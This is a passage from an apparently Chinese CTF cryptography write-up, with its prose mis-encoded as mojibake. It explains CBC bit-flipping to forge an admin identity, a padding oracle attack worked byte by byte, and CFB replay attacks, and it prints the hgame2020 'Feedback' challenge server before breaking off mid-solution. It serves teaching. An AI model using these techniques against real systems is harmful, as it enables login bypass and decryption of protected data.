id="CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification-attack-on-CBCï¼‰"><a href="#CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification-attack-on-CBCï¼‰" class="headerlink" title="CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification attack on CBCï¼‰"></a>CBCåè½¬å­—èŠ‚æ”»å‡»ï¼ˆModification attack on CBCï¼‰</h5><p><img src="https://i.loli.net/2020/04/30/SIzAO5KaUT47XCj.png" alt="Modification attack on CBC"></p><p>åœ¨åŠ å¯†æ—¶ï¼Œå‰ä¸€ç»„æ˜æ–‡ä¼šå½±å“åé¢æ‰€æœ‰åˆ†ç»„çš„å¯†æ–‡ã€‚</p><p>ä½†æ˜¯åœ¨è§£å¯†æ—¶ï¼Œç”±å…¬å¼åŠåŸç†å›¾å¯çŸ¥ï¼Œä¸€ç»„å¯†æ–‡åªä¼šå½±å“è¿™ä¸€ç»„çš„è§£å¯†ç»“æœå’Œä¸‹ä¸€ç»„çš„è§£å¯†ç»“æœã€‚</p><p>æˆ‘ä»¬çœ‹åˆ°ç®­å¤´2ï¼Œè¿™ä¸€ç»„Ciphertextï¼ˆå¯†æ–‡2ï¼‰åœ¨Decryptionï¼ˆè§£å¯†ï¼‰ä¹‹åä¼šç”ŸæˆCiphertext_1ï¼ˆæˆ‘yyçš„ï¼‰ï¼Œç„¶åè¿™ä¸ªCiphertext_1ä¸ç®­å¤´1æ‰€æŒ‡çš„Ciphertextï¼ˆå¯†æ–‡1ï¼‰æŒ‰ä½å¼‚æˆ–åæœ€ç»ˆç”ŸæˆPlaintextï¼ˆæ˜æ–‡2ï¼‰</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹Ciphertext1ï¼Œæ¥è¾¾åˆ°æ§åˆ¶Plaintext2çš„æ•ˆæœï¼Œå½“ç„¶å¦‚æœæƒ³è¦ç²¾ç¡®æ§åˆ¶ï¼Œåˆ™éœ€è¦çŸ¥é“Plaintext2çš„å…·ä½“å†…å®¹ã€‚ï¼ˆåœ¨æŸäº›ç‰¹å®šæ¡ä»¶ä¸‹ï¼ŒPlaintext2çš„å†…å®¹å¯ä»¥åˆ©ç”¨Padding Oracle Attack æ¥è·å–ï¼Œä¸‹æ–‡ä¼šç®€ç•¥ä»‹ç»è¿™ç§æ”»å‡»æ–¹å¼ï¼‰</p><p>å¹¶ä¸”ç”±äºCiphertext1çš„ä¿®æ”¹ï¼Œå¯¼è‡´è‡ªå·±è¿™ä¸€ç»„çš„è§£å¯†ä¼šå—å½±å“ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¿®æ”¹å›¾ä¸­çš„IVæ¥ç»™Ciphertext1â€œæ“¦ä¸ªå±è‚¡â€ã€‚ï¼ˆå¦‚æœå‰é¢ä¸æ˜¯IVå‘¢ï¼Ÿé‚£åªèƒ½ä¸€è·¯æ”¹ä¸‹å»ï¼Œç›´åˆ°IVä¸ºæ­¢äº†ã€‚ã€‚ã€‚ï¼‰</p><h5 id="CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡»-åº”ç”¨åœºæ™¯"><a href="#CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡»-åº”ç”¨åœºæ™¯" class="headerlink" title="CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡» åº”ç”¨åœºæ™¯"></a>CTFä¸­CBCåè½¬å­—èŠ‚æ”»å‡» åº”ç”¨åœºæ™¯</h5><p>â€‹        CBCåè½¬å­—èŠ‚æ”»å‡»å¯èƒ½ä¼šç”¨äºWebé¢˜ä¸­çš„ç»•è¿‡ã€‚æ¯”å¦‚ä¸€ä¸ªç™»é™†ï¼Œç„¶ååœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å°†ä½ æäº¤çš„ä¿¡æ¯ç”¨åˆ†ç»„å¯†ç åŠ å¯†ï¼Œæ¨¡å¼æ˜¯CBCï¼Œç„¶ååˆ°æœåŠ¡ç«¯åå†è§£å¯†ã€‚</p><p>&emsp;&emsp;æäº¤çš„æ—¶å€™ä»–ä¸è®©ä½ å¡«å†™adminï¼Œä½†æ˜¯é¢˜ç›®åˆéœ€è¦ä½ æœ‰adminçš„èº«ä»½ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥è€ƒè™‘ç”¨CBCåè½¬å­—èŠ‚æ”»å‡»ç»•è¿‡è¿‡æ»¤ã€‚</p><p>&emsp;&emsp;æ¯”å¦‚ï¼šå…ˆç”¨bdminçš„èº«ä»½ç™»é™†ï¼Œç„¶åæ‹¦æˆªã€æ›´æ”¹èº«ä»½å¯¹åº”å¯†æ–‡ç»„çš„<strong>å‰</strong>ä¸€ç»„çš„å¯¹åº”ä½ï¼Œè®©æœåŠ¡å™¨å°†èº«ä»½è§£å¯†æˆæ˜æ–‡åä¸ºadminï¼Œä½†æ˜¯èº«ä»½å‰ä¸€ç»„çš„æ˜æ–‡åº”è¯¥æ˜¯æ¯æ‰äº†ï¼Œé‚£å°±å†æ”¹å‰ä¸€ç»„çš„å¯†æ–‡æ¥è¿›è¡Œè¡¥æ•‘ï¼Œç›´åˆ°æ”¹åˆ°åˆå§‹å‘é‡IVä¸ºæ­¢ã€‚</p><h5 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h5><p>è¿™é‡Œç²—ç•¥ä»‹ç»ä¸€ä¸‹CBCæ¨¡å¼ä¸‹çš„Padding Oracle Attack </p><p>&emsp;&emsp;åœ¨AESåŠ å¯†çš„CBCæ¨¡å¼ä¸­ï¼Œè‹¥åŠ å¯†æ•°æ®çš„é•¿åº¦æ¨¡é™¤åˆ†å—é•¿åº¦è€Œæœ‰ä½™ï¼Œåˆ™ä¼šåœ¨æœ«å°¾å¡«å……ä¸€ç»„æ•°æ®ã€‚</p><p>å³<strong>(pad_length-len(data)%pad_length)*hex(pad_length-len(data)%pad_length)</strong></p><p>ä¸¾ä¸ªæ —å­ï¼ˆ8å­—èŠ‚ä¸€ç»„ï¼‰</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®ï¼š</span><br><span class="line">aaaaa</span><br><span class="line">å¡«å……åçš„æ•°æ®ï¼š</span><br><span class="line">aaaaa\<span class="keyword">x</span><span class="number">3</span>\<span class="keyword">x</span><span class="number">3</span>\<span class="keyword">x</span><span class="number">3</span></span><br><span class="line">æ•°æ®ï¼š</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">å¡«å……åçš„æ•°æ®ï¼š</span><br><span class="line">aaaaaaaaaa\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span></span><br><span class="line">æ•°æ®ï¼š</span><br><span class="line">aaaaaaaa</span><br><span class="line">å¡«å……åçš„æ•°æ®ï¼š</span><br><span class="line">aaaaaaaa\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span></span><br></pre></td></tr></table></figure><p>â€‹        Padding Oracle Attack éœ€è¦ä¸¤ä¸ªå‰æå°±æ˜¯ï¼š</p><p>1.å¯ä»¥æ§åˆ¶å¯†æ–‡ æˆ–è€… IV </p><p>2.å¦‚æœè§£å¯†åä¸æ»¡è¶³ padding æœåŠ¡ç«¯ä¼šæŠ¥é”™. ï¼ˆåªæœ‰æœ€åä¸€ä¸ªå—é•¿åº¦ä¸è¶³æ—¶ä¼šæœ‰å¡«å……ï¼‰</p><p>å†æ¬¡ä¸¾æ —å­ï¼š</p><p>&emsp;&emsp;æ­¤å¤„é€‰æ‹©äº†<strong>AES-128</strong>ä½œä¸ºä¾‹å­ï¼Œæ˜æ–‡é•¿åº¦ä¸º<strong>17</strong>ä½ï¼Œæ•…è¡¥é½è‡³<strong>32</strong>ä½ååˆ†<strong>2</strong>ç»„è¿›è¡ŒåŠ å¯†ã€‚</p><p>&emsp;&emsp;ç„¶åæˆ‘ä»¬ä¼ªé€ ä¸€ç»„IVæ¥å’Œç¬¬ä¸€ç»„å¯†æ–‡ä¸€èµ·å‘å›æœåŠ¡å™¨ï¼Œè®©å…¶è¿›è¡Œåˆ¤å®šã€‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šsouthseastisacat!</span><br><span class="line">IVï¼š<span class="symbol">\x</span>31<span class="symbol">\x</span>32<span class="symbol">\x</span>33<span class="symbol">\x</span>34<span class="symbol">\x</span>35<span class="symbol">\x</span>36<span class="symbol">\x</span>37<span class="symbol">\x</span>38<span class="symbol">\x</span>38<span class="symbol">\x</span>37<span class="symbol">\x</span>36<span class="symbol">\x</span>35<span class="symbol">\x</span>34<span class="symbol">\x</span>33<span class="symbol">\x</span>32<span class="symbol">\x</span>31</span><br><span class="line">å¯†æ–‡ï¼š<span class="symbol">\x</span>bf<span class="symbol">\x</span>61<span class="symbol">\x</span>b3<span class="symbol">\x</span>1b<span class="symbol">\x</span>d3<span class="symbol">\x</span>6a<span class="symbol">\x</span>47<span class="symbol">\x</span>11<span class="symbol">\x</span>b9<span class="symbol">\x</span>cc<span class="symbol">\x</span>d7<span class="symbol">\x</span>11<span class="symbol">\x</span>7b<span class="symbol">\x</span>8a<span class="symbol">\x</span>42<span class="symbol">\x</span>d9<span class="symbol">\x</span>3a<span class="symbol">\x</span>1e<span class="symbol">\x</span>37<span class="symbol">\x</span>e9<span class="symbol">\x</span>d2<span class="symbol">\x</span>de<span class="symbol">\x</span>fa<span class="symbol">\x</span>ca<span class="symbol">\x</span>a2<span class="symbol">\x</span>50<span class="symbol">\x</span>fd<span class="symbol">\x</span>c0<span class="symbol">\x</span>6e<span class="symbol">\x</span>f2<span class="symbol">\x</span>11<span class="symbol">\x</span>c1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;å¯¹IVçš„æœ€åä¸€ä½å­—ç¬¦è¿›è¡Œçˆ†ç ´ï¼Œæ„é€ <strong>0x00</strong>åˆ°<strong>0xff</strong>ï¼Œä½¿å¾—ç¬¬ä¸€ç»„å¯†æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚è§£å¯†çš„ç»“æœåŒIVå¼‚æˆ–ç»“æœä¸º<strong>0x01</strong>ï¼Œå¯¼è‡´<strong>Padding</strong>é€šè¿‡ï¼Œå½“IVæœ€åä¸€ä½å­—ç¬¦æ˜¯0x44æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­£ç¡®ç»“æœã€‚</p><p>&emsp;&emsp;è¿™æ—¶IVçš„æœ€åä¸€ä¸ªå­—èŠ‚å’ŒåŸIVçš„æœ€åä¸€ä¸ªå­—èŠ‚è¿˜æœ‰<strong>0x01</strong>å¼‚æˆ–ï¼Œå³<strong>0x44^0x31^0x01</strong>ï¼Œå¾—åˆ°ç»“æœä¸º<strong>t</strong>ï¼Œæ˜¯ç¬¬ä¸€ç»„æ˜æ–‡çš„æœ€åä¸€ä¸ªå­—ç¬¦ã€‚</p><p>&emsp;&emsp;ç„¶åå¯ä»¥å›ºå®šIVçš„æœ€åä¸€ä¸ªå€¼ä½¿å¾—ç¬¬ä¸€ç»„å¯†æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚è§£å¯†çš„ç»“æœåŒIVå¼‚æˆ–ç»“æœä¸º<strong>0x02</strong>ï¼Œæ­¤æ—¶çˆ†ç ´IVåˆ°æ•°ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œå½“ç¬¬ä¸€ç»„å¯†æ–‡çš„åˆ°æ•°ç¬¬äºŒä¸ªå­—èŠ‚è§£å¯†çš„ç»“æœåŒIVå¼‚æˆ–ç»“æœä¸º<strong>0x02</strong>æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­£ç¡®ç»“æœï¼Œæ­¤æ—¶åˆèƒ½ç¡®å®šç¬¬ä¸€ç»„æ˜æ–‡çš„å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨_</p><hr><h4 id="å¯†ç åé¦ˆæ¨¡å¼-CFB"><a href="#å¯†ç åé¦ˆæ¨¡å¼-CFB" class="headerlink" title="å¯†ç åé¦ˆæ¨¡å¼(CFB)"></a>å¯†ç åé¦ˆæ¨¡å¼(CFB)</h4><p>ä¸CBCç±»ä¼¼ï¼ŒCFBæ¨¡å¼æ¯ä¸€ç»„çš„å¯†æ–‡ä¹Ÿä¼šå½±å“åç»­æ‰€æœ‰ç»„çš„å¯†æ–‡ï¼Œç›´æ¥çœ‹åŠ è§£å¯†è§„åˆ™å§</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›</strong></p><p><strong>$x_iï¼Œy_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼ŒIVè¡¨ç¤ºé•¿åº¦ä¸ºbçš„åˆå§‹å‘é‡</strong>ï¼ˆä¸éœ€è¦å¡«å……ï¼‰</p><p><strong>åŠ å¯†</strong>ï¼š$y_1=e_k(IV)âŠ•x_1$     </p><p>&emsp;&emsp;    $y_i=e_k(y_{i-1})âŠ•x_i      ,iâ‰¥2$ </p><p><strong>è§£å¯†</strong>ï¼š$x_1=e_k(IV)âŠ•y_1$</p><p>&emsp;&emsp;    $x_i=e_k(y_{i-1})âŠ•y_i    ,iâ‰¥2$ </p><p>&emsp;&emsp;åŠ å¯†ä¸Šé¢ç¡®å®æ„Ÿè§‰æŒºåƒï¼Œåªæ˜¯$x_i$å’ŒâŠ•åœ¨æ‹¬å·é‡Œè¿˜æ˜¯åœ¨æ‹¬å·å¤–çš„åŒºåˆ«ã€‚ä½†æ­£å› ä¸ºè¿™ç‚¹å°å°çš„åŒºåˆ«ï¼Œå¯¼è‡´è§£å¯†ä¸ŠCFBæ¨¡å¼ä»ç„¶ç”¨çš„æ˜¯åˆ†ç»„åŠ å¯†çš„åŠ å¯†å‡½æ•°ã€‚</p><p>&emsp;&emsp;ç±»ä¼¼â€œCBCç¿»è½¬å­—èŠ‚æ”»å‡»â€ï¼Œåœ¨CFBä¸Šä¹Ÿå¯è¿›è¡Œç±»ä¼¼çš„æ§åˆ¶ï¼Œåªä¸è¿‡è¿™æ¬¡â€œæ“¦å±è‚¡çš„äººâ€æ˜¯è¿™ä¸€ç»„å¯†æ–‡åé¢çš„æ‰€æœ‰å¯†æ–‡ç»„äº†ã€‚</p><h5 id="ç¼ºé™·-2"><a href="#ç¼ºé™·-2" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>ä¸CBCç±»ä¼¼ï¼Œå› ä¸ºæŸäº›åŸå› ï¼Œä½¿å¾—æŸä¸€ç»„å¯†æ–‡ä¸­å‡ºç°äº†é”™è¯¯çš„bitï¼Œå°†å½±å“è¿™ä¸€ç»„(ç›¸åº”ä½)åŠå…¶ä¹‹åä¸€ç»„(æ•´ç»„)åˆ†ç»„çš„è§£å¯†ã€‚CFBæ¨¡å¼ä¹Ÿä¸å¯æŠµå¾¡é‡æ”¾æ”»å‡»ã€‚</p><h5 id="é‡æ”¾æ”»å‡»"><a href="#é‡æ”¾æ”»å‡»" class="headerlink" title="é‡æ”¾æ”»å‡»"></a>é‡æ”¾æ”»å‡»</h5><p>ä¸¾ä¸ªæ —å­ï¼š</p><p>â€‹        Aliceå‘Bobå‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œè¿™æ¡æ¶ˆæ¯ç”±4ä¸ªå¯†æ–‡åˆ†ç»„ç»„æˆã€‚ä¸»åŠ¨æ”»å‡»è€…Malloryå°†è¯¥æ¶ˆæ¯ä¸­çš„å3ä¸ªå¯†æ–‡åˆ†ç»„ä¿å­˜äº†ä¸‹æ¥ã€‚ç¬¬äºŒå¤©ï¼ŒAliceåˆå‘Bobå‘é€äº†å†…å®¹ä¸åŒçš„4ä¸ªå¯†æ–‡åˆ†ç»„ï¼ˆå‡è®¾Aliceä½¿ç”¨äº†<strong>ç›¸åŒçš„å¯†é’¥</strong>ï¼‰ã€‚æ”»å‡»è€…ç”¨æ˜¨å¤©ä¿å­˜ä¸‹æ¥çš„3ä¸ªå¯†æ–‡åˆ†åˆ«å°†ä»Šå¤©å‘é€çš„å3ä¸ªå¯†æ–‡åˆ†ç»„è¿›è¡Œäº†æ›¿æ¢ã€‚</p><p>&emsp;&emsp;äºæ˜¯ï¼ŒBobè§£å¯†æ—¶ï¼Œ4ä¸ªåˆ†ç»„ä¸­åªæœ‰ç¬¬1ä¸ªå¯ä»¥è§£å¯†æˆæ­£ç¡®çš„æ˜æ–‡åˆ†ç»„ï¼Œç¬¬2ä¸ªä¼šå‡ºé”™ï¼Œè€Œç¬¬3ä¸ªå’Œç¬¬4ä¸ªåˆ™å˜æˆäº†è¢«æ”»å‡»è€…æ›¿æ¢çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯æ˜¨å¤©å‘é€çš„æ˜æ–‡å†…å®¹ï¼‰ã€‚æ”»å‡»è€…æ²¡æœ‰ç ´è§£å¯†ç ï¼Œå°±æˆåŠŸåœ°ç”¨ä»¥å‰çš„ç”µæ–‡æ··å…¥äº†æ–°ç”µæ–‡ä¸­ã€‚è€Œç¬¬2ä¸ªåˆ†ç»„å‡ºé”™åˆ°åº•æ˜¯é€šä¿¡é”™è¯¯å‘¢ï¼Œè¿˜æ˜¯è¢«äººæ”»å‡»æ‰€é€ æˆçš„å‘¢ï¼ŸBobæ˜¯æ— æ³•åšå‡ºåˆ¤æ–­çš„ã€‚<br><img src="https://i.loli.net/2020/04/30/Qa8tms7dURFvIEB.png" alt="é‡æ”¾æ”»å‡»"></p><h5 id="CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback"><a href="#CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback" class="headerlink" title="CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback"></a>CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import os, random</span><br><span class="line">import string, binascii</span><br><span class="line">import signal</span><br><span class="line">import socketserver</span><br><span class="line">from hashlib import sha256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from secret import MESSAGE</span><br><span class="line">assert len(MESSAGE) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="title">socketserver</span>.<span class="title">BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, *args, **kargs)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.KEY = b<span class="string">""</span></span><br><span class="line">        <span class="keyword">self</span>.IV = b<span class="string">""</span></span><br><span class="line">        <span class="keyword">super</span>().__init_<span class="number">_</span>(*args, **kargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            part = <span class="keyword">self</span>.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> len(part) &lt; <span class="symbol">BUFF_SIZE:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(<span class="keyword">self</span>, msg, newline=True)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="symbol">newline:</span> msg += b<span class="string">'\n'</span></span><br><span class="line">            <span class="keyword">self</span>.request.sendall(msg)</span><br><span class="line">        <span class="symbol">except:</span></span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(<span class="keyword">self</span>, prompt=b<span class="string">'&gt; '</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.send(prompt, newline=False)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">self</span>, data)</span></span><span class="symbol">:</span></span><br><span class="line">        assert len(data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">        aes = AES.new(<span class="keyword">self</span>.KEY, AES.MODE_CFB, <span class="keyword">self</span>.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">self</span>, data)</span></span><span class="symbol">:</span></span><br><span class="line">        assert len(data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">        aes = AES.new(<span class="keyword">self</span>.KEY, AES.MODE_CFB, <span class="keyword">self</span>.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.decrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">self</span>.KEY = os.urandom(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">self</span>.IV = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.send(b<span class="string">"You have only 3 times to decrypt sth, then I'll give u the FLAG."</span>)</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> range(<span class="number">3</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>.send(b<span class="string">"Give me sth(hex) to decrypt"</span>)</span><br><span class="line">                hex_input = <span class="keyword">self</span>.recv()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">hex_input:</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                ciphertext = binascii.unhexlify(hex_input)</span><br><span class="line">                plaintext = <span class="keyword">self</span>.decrypt(ciphertext)</span><br><span class="line">                <span class="keyword">self</span>.send( binascii.hexlify(plaintext) )</span><br><span class="line">        <span class="symbol">except:</span></span><br><span class="line">            <span class="keyword">self</span>.send(b<span class="string">"Rua!!!"</span>)</span><br><span class="line">            <span class="keyword">self</span>.request.close()</span><br><span class="line"></span><br><span class="line">        enc_msg = <span class="keyword">self</span>.encrypt(MESSAGE)</span><br><span class="line">        <span class="keyword">self</span>.send(b<span class="string">"Here is your encrypted FLAG(hex): "</span>, newline=False)</span><br><span class="line">        <span class="keyword">self</span>.send( binascii.hexlify(enc_msg) )</span><br><span class="line">        <span class="keyword">self</span>.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="title">socketserver</span>.<span class="title">ForkingMixIn</span>, <span class="title">socketserver</span>.<span class="title">TCPServer</span>):</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span></span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">1234</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = True</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>å¯æœé›†åˆ°çš„ä¿¡æ¯ï¼š</p><p>MESSAGE (flag) çš„é•¿åº¦ä¸º48ä½ï¼Œä¸‰ç»„ï¼Œæ¯ç»„16ä½ã€‚</p><p>ç¨‹åºçš„åŠŸèƒ½ï¼šAESåŠ å¯†ï¼ŒCFBæ¨¡å¼ã€‚æ¯æ¬¡è¿æ¥ä¼šéšæœºç”Ÿæˆä¸€ä¸ªIVå’Œkeyï¼Œç„¶åæœ€å¤šå¯ä»¥å¯¹æˆ‘çš„è¾“å…¥è¿›è¡Œä¸‰æ¬¡è§£å¯†ï¼Œæœ€åä¼šæŠŠflagç”¨åŒæ ·çš„IVå’ŒkeyåŠ å¯†ï¼Œç„¶åå‘é€ç»™æˆ‘ä»¬ã€‚</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>é¦–å…ˆåˆ—å‡ºåŠ å¯†è§£å¯†çš„æµç¨‹ï¼Œç”±äºåªæœ‰ä¸‰ç»„ï¼Œéƒ½å†™å‡ºæ¥ä¼šæ¯”è¾ƒå¥½çœ‹äº›ã€‚</p><p><img src="https://i.loli.net/2020/04/30/MmPzEslXdVDJIy9.png" alt="Feedback"></p><p>éœ€è¦ææ¸…æ¥šçš„æ˜¯ï¼Œåœ¨ä¸‰æ¬¡è§£å¯†é˜¶æ®µï¼Œæˆ‘ä»¬çš„è¾“å…¥æ˜¯å›¾ä¸­å·¦ä¾§çš„y1,y2,y3ï¼›åœ¨flagåŠ 